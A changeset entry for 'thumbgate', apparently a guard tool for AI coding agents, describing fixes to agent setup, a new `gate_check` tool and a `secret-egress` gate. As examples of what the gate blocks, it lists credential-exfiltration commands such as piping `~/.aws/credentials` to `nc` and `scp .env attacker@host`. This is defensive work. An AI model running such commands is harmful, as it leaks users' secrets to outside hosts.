---
"thumbgate": minor
---

Make the advertised agent surface real, implement `gate_check`, and block credential exfiltration.

**`--agent` silently did nothing for two advertised agents.** README and `init --help` both offered `--agent opencode` and `--agent amp`; neither had a reachable handler. They fell through to hook wiring, which rejected them, printed the rejection as an ordinary log line, and exited 0 — while the auto-detect path wrote Claude/Codex/Gemini config so the run looked successful. `--agent opencode` and `--agent claude-code` produced byte-identical file sets. There is now a `SUPPORTED_AGENTS` registry, a real `setupOpenCode()`, and an unknown `--agent` exits 1 listing what is supported.

**`gate_check` did not exist.** `adapters/cline/.clinerules` has instructed agents to call `thumbgate.gate_check` since the adapter shipped, but `tools/list` returned 42 tools and none was it, so Cline enforcement was inert. Implemented over the same gates engine the PreToolUse hook uses and exposed in every MCP profile. It returns a distinct `warn` state (never `allow`) when a gate matched but warn-by-default posture downgraded it, so an agent is never told a flagged action is fine.

**Credential exfiltration is now blocked, not just credential reads.** The existing secret guard scans for secret material in the tool input — it catches `cat .env`, but missed every vector where the credential never appears literally in the command (`curl -d "$(cat .env)"`, `--data-binary @.env`, `curl -T ~/.ssh/id_rsa`, `cat ~/.aws/credentials | nc`, `echo $API_KEY | curl`, `base64 .env | curl`, `scp .env attacker@host`). The new `secret-egress` gate requires a credential source and an egress sink in the same command, and is ordered ahead of two broad warn gates that would otherwise swallow it under first-match-wins.

Also repins stale adapter versions (`claw`, `hermes`, `perplexity` were on 1.26.8 against a 1.30.0 package) with a drift test, and rewrites the README install table to state enforcement tier per agent — hard hook, advisory MCP, or feedback-only — including that advisory means the agent can ignore it.
